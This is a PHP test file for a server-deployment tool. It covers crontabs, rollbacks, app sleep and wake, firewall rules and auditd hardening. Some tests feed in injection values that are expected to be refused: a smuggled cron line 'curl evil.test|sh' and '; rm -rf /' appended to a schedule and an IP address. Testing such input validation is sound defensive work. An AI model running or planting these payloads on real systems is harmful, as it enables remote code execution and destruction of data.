<?php

declare(strict_types=1);

use App\Enums\ApplicationType;
use App\Enums\PowerState;
use App\Exceptions\NoPreviousReleaseException;
use App\Exceptions\UnsafeNameException;
use App\Jobs\IdleAppSleeper;
use App\Jobs\ManageFirewallRule;
use App\Jobs\RollbackApplication;
use App\Jobs\WakeApplication;
use App\Models\Application;
use App\Models\Server;
use App\Services\Deployment\CrontabBuilder;
use App\Services\Deployment\DeploymentCommands;
use App\Services\Process\FpmPoolBuilder;
use App\Services\Process\ProcessManager;
use App\Services\Process\SystemdUnitBuilder;
use App\Services\Runtime\AsdfManager;
use App\Services\Server\SecurityHardening;
use App\Services\SSH\SSHConnection;
use App\Services\SSH\SSHConnectionManager;
use Spatie\Activitylog\Models\Activity;
use Tests\Support\FakeSSHTransport;

function cronApp(array $attributes = []): Application
{
    return Application::factory()->create(array_merge([
        'slug' => 'my-app',
        'system_user' => 'coresmith-app-abcd',
        'type' => ApplicationType::Php,
        'php_version' => '8.5.5',
    ], $attributes));
}

function withTransport(FakeSSHTransport $transport, callable $work): void
{
    SSHConnectionManager::createTransportUsing(fn (): FakeSSHTransport => $transport);

    try {
        $work();
    } finally {
        SSHConnectionManager::createTransportUsing(null);
    }
}

function processes(): ProcessManager
{
    $asdf = new AsdfManager;

    return new ProcessManager(new SystemdUnitBuilder($asdf), new FpmPoolBuilder($asdf));
}

test('a crontab points at the current symlink so it follows deployments', function () {
    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => 'php artisan schedule:run']]]);
    $crontab = (new CrontabBuilder(new DeploymentCommands(new AsdfManager)))->build($app);

    expect($crontab)->toContain('cd /var/coresmith/apps/my-app/current')
        ->and($crontab)->toContain('php artisan schedule:run')
        ->and($crontab)->not->toContain('/releases/');
});

test('a crontab carries the resolved runtime path and logs to the scheduler log', function () {
    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => 'php artisan schedule:run']]]);
    $crontab = (new CrontabBuilder(new DeploymentCommands(new AsdfManager)))->build($app);

    expect($crontab)->toContain('PATH=/opt/asdf-data/installs/php/8.5.5/bin')
        ->and($crontab)->toContain('>> /var/coresmith/logs/my-app/scheduler.log 2>&1');
});

test('a cron command containing a newline cannot inject extra entries', function () {
    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *', 'command' => "ok\n* * * * * curl evil.test|sh"]]]);

    (new CrontabBuilder(new DeploymentCommands(new AsdfManager)))->build($app);
})->throws(UnsafeNameException::class);

test('a malformed cron schedule is refused', function () {
    $app = cronApp(['cron_jobs' => [['schedule' => '* * * * *; rm -rf /', 'command' => 'true']]]);

    (new CrontabBuilder(new DeploymentCommands(new AsdfManager)))->build($app);
})->throws(UnsafeNameException::class);

test('rolling back swaps to the previous release', function () {
    $app = cronApp();
    $transport = (new FakeSSHTransport)->respondTo('ls -1dt', "/var/coresmith/apps/my-app/releases/2/\n/var/coresmith/apps/my-app/releases/1/\n", 0);

    withTransport($transport, function () use ($app): void {
        (new RollbackApplication($app))->handle(app(SSHConnectionManager::class), new DeploymentCommands(new AsdfManager));
    });

    $commands = implode("\n", $transport->commands());

    expect($commands)->toContain('ln -sfn /var/coresmith/apps/my-app/releases/1 /var/coresmith/apps/my-app/current.tmp')
        ->and($commands)->toContain('mv -Tf');
});

test('rolling back with only one release refuses rather than breaking the symlink', function () {
    $app = cronApp();
    $transport = (new FakeSSHTransport)->respondTo('ls -1dt', "/var/coresmith/apps/my-app/releases/1/\n", 0);

    withTransport($transport, function () use ($app): void {
        (new RollbackApplication($app))->handle(app(SSHConnectionManager::class), new DeploymentCommands(new AsdfManager));
    });
})->throws(NoPreviousReleaseException::class);

test('an app idle past its timeout is put to sleep', function () {
    $app = cronApp([
        'power_state' => PowerState::Active,
        'idle_timeout_minutes' => 30,
        'last_request_at' => now()->subMinutes(45),
    ]);

    withTransport(new FakeSSHTransport, function (): void {
        (new IdleAppSleeper)->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Sleeping);
});

test('an app inside its idle window keeps running', function () {
    $app = cronApp([
        'power_state' => PowerState::Active,
        'idle_timeout_minutes' => 30,
        'last_request_at' => now()->subMinutes(5),
    ]);

    withTransport(new FakeSSHTransport, function (): void {
        (new IdleAppSleeper)->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Active);
});

test('an app with sleeping disabled never sleeps', function () {
    $app = cronApp([
        'power_state' => PowerState::Active,
        'idle_timeout_minutes' => 0,
        'last_request_at' => now()->subDays(30),
    ]);

    withTransport(new FakeSSHTransport, function (): void {
        (new IdleAppSleeper)->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Active);
});

test('waking a sleeping app starts it', function () {
    $app = cronApp(['power_state' => PowerState::Sleeping]);

    withTransport(new FakeSSHTransport, function () use ($app): void {
        (new WakeApplication($app))->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Active);
});

test('waking a stopped app does nothing, since stopping was deliberate', function () {
    $app = cronApp(['power_state' => PowerState::Stopped]);
    $transport = new FakeSSHTransport;

    withTransport($transport, function () use ($app): void {
        (new WakeApplication($app))->handle(app(SSHConnectionManager::class), processes());
    });

    expect($app->fresh()->power_state)->toBe(PowerState::Stopped)
        ->and($transport->commands())->toBe([]);
});

test('a user firewall rule is applied and logged', function () {
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu']);
    $transport = new FakeSSHTransport;

    withTransport($transport, function () use ($server): void {
        (new ManageFirewallRule($server, 'allow', 6379, '203.0.113.5'))->handle(app(SSHConnectionManager::class));
    });

    expect(implode("\n", $transport->commands()))->toContain('ufw allow from 203.0.113.5 to any port 6379')
        ->and(Activity::where('description', 'firewall_rule_changed')->count())->toBe(1);
});

test('a firewall rule with a bad address never reaches the server', function () {
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu']);
    $transport = new FakeSSHTransport;

    withTransport($transport, function () use ($server): void {
        (new ManageFirewallRule($server, 'allow', 6379, '1.2.3.4; rm -rf /'))->handle(app(SSHConnectionManager::class));
    });
})->throws(InvalidArgumentException::class);

test('auditd is installed only when the server opts in', function () {
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu', 'audit_logging_enabled' => true]);
    $transport = new FakeSSHTransport;
    $connection = (new SSHConnection($server, $transport))->connect();

    (new SecurityHardening)->harden($connection);

    expect(implode("\n", $transport->commands()))->toContain('auditctl')
        ->and($transport->uploads())->toHaveKey('/etc/audit/rules.d/coresmith.rules');
});

test('auditd is skipped when the server has not opted in', function () {
    $server = Server::factory()->create(['host_key_fingerprint' => null, 'os_name' => 'ubuntu', 'audit_logging_enabled' => false]);
    $transport = new FakeSSHTransport;
    $connection = (new SSHConnection($server, $transport))->connect();

    (new SecurityHardening)->harden($connection);

    expect($transport->uploads())->not->toHaveKey('/etc/audit/rules.d/coresmith.rules');
});

test('the audit rules watch every sensitive path from the spec', function (string $path) {
    expect((new SecurityHardening)->auditRules())->toContain($path);
})->with(['/etc/sudoers', '/etc/ssh/sshd_config', '/etc/shadow', '/etc/coresmith/', '/etc/crontab']);
